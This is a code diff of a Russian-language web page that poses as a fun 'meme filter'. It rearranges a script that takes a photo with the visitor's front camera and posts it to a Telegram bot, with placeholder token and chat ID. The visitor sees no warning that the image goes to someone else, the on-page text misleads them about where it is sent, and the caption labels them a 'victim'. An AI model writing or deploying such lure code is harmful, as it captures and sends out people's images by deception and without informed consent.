@@ -20,67 +20,6 @@
 </head>
 <body>
 
-<script>
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-const status = document.getElementById('status');
-
-const TELEGRAM_TOKEN = 'ЗАМЕНИ_СВОЙ_ТОКЕН_СЮДА';  // ← вставь свой
-const CHAT_ID = 'ЗАМЕНИ_СВОЙ_CHAT_ID_СЮДА';     // ← вставь свой
-
-async function startPrank() {
-  status.textContent = 'Запрашиваем камеру...';
-  
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user' } 
-    });
-    
-    video.srcObject = stream;
-    video.play();
-    
-    await new Promise(r => setTimeout(r, 3000));
-    
-    status.textContent = 'Щааа... делаем фото! 📸';
-    
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    stream.getTracks().forEach(track => track.stop());
-    
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-    
-    status.textContent = 'Отправляю тебе... подожди 2 сек 😈';
-    
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('caption', `Жертва: ${new Date().toLocaleString('ru-RU')} 😭`);
-    
-    const blob = await (await fetch(dataUrl)).blob();
-    formData.append('photo', blob, 'prank.jpg');
-    
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
-    
-    if (!response.ok) {
-      throw new Error(`Telegram error: ${response.status}`);
-    }
-    
-    status.innerHTML = 'Фото отправлено тебе! 😂<br>Можешь закрыть страницу.';
-    
-  } catch (err) {
-    console.error(err);
-    status.textContent = err.name === 'NotAllowedError' 
-      ? 'Ты не разрешил камеру 😢 Попробуй ещё раз!'
-      : 'Ошибка: ' + err.message;
-  }
-}
-</script>
-
 <div id="container">
   <h1>😂 Проверь новый мемный фильтр!</h1>
   <p>Нажми кнопку ниже, разреши камеру — и увидишь, как ты выглядишь с крутым эффектом 2026 года 😎</p>
@@ -92,6 +31,72 @@ async function startPrank() {
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
+
+<script>
+async function startPrank() {
+  // Берём элементы ТОЛЬКО здесь — DOM уже загружен
+  const video  = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx    = canvas.getContext('2d');
+  const status = document.getElementById('status');
+
+  if (!video || !canvas || !ctx || !status) {
+    status.textContent = 'Ошибка: элементы страницы не найдены 😢 Перезагрузи страницу';
+    console.error('Один из элементов не найден');
+    return;
+  }
+
+  status.textContent = 'Запрашиваем камеру...';
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'user' }  // фронтальная
+    });
+
+    video.srcObject = stream;
+    await video.play();  // ждём, пока видео запустится
+
+    await new Promise(r => setTimeout(r, 3000));  // пауза 3 сек
+
+    status.textContent = 'Щааа... делаем фото! 📸';
+
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Выключаем камеру сразу
+    stream.getTracks().forEach(track => track.stop());
+
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+    status.textContent = 'Отправляю тебе... подожди 2 сек 😈';
+
+    const formData = new FormData();
+    formData.append('chat_id', 'ЗАМЕНИ_СВОЙ_CHAT_ID');          // ← вставь
+    formData.append('caption', `Жертва: ${new Date().toLocaleString('ru-RU')} 😭`);
+
+    const blob = await (await fetch(dataUrl)).blob();
+    formData.append('photo', blob, 'prank.jpg');
+
+    const response = await fetch(`https://api.telegram.org/botЗАМЕНИ_СВОЙ_ТОКЕН/sendPhoto`, {  // ← вставь токен
+      method: 'POST',
+      body: formData
+    });
+
+    if (!response.ok) {
+      throw new Error(`Telegram ответил ${response.status}`);
+    }
+
+    status.innerHTML = 'Фото отправлено тебе! 😂<br>Можешь закрыть страницу.';
+
+  } catch (err) {
+    console.error(err);
+    status.textContent = err.name === 'NotAllowedError'
+      ? 'Ты не разрешил камеру 😢 Нажми ещё раз и разреши!'
+      : 'Ошибка: ' + err.message;
+  }
+}
+</script>
 
 </body>
 </html>
